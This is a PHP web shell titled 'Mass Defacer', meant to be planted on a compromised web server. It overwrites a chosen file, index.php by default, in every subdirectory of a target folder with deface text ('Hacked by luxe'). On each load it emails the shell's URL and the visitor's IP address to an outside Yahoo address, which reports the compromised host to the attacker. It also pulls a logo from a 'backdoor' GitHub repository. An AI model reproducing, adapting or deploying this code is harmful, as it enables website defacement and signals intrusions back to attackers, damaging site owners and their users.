<?php
$apper = 'clipcopy@yahoo.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$ms = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($apper, "LOG", $ms, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
echo "<title>Mass Defacer</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='white'><font color=red'><font face='comic sans ms'>";
echo "<center><form method='POST'>";
echo "<img src='https://raw.githubusercontent.com/k0wk/backdoor/main/logo.jpg' width=30% hight=40% />
<hr color='black'><font color='black'>Target Folder</font><br>
<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd ()."'><br><br>";
echo "<font color='black'>Name of File</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br>";
echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by luxe</textarea><br>";
echo "<input type='submit' value='7wimo :v'></form></center>";
 
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['andela'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "<hr color='black'>>> <font color='black'>$index&nbsp&nbsp&nbsp&nbsp</font><font color='lime'>(&#10003;)</font>";
                }
        endforeach;
}
 
?>
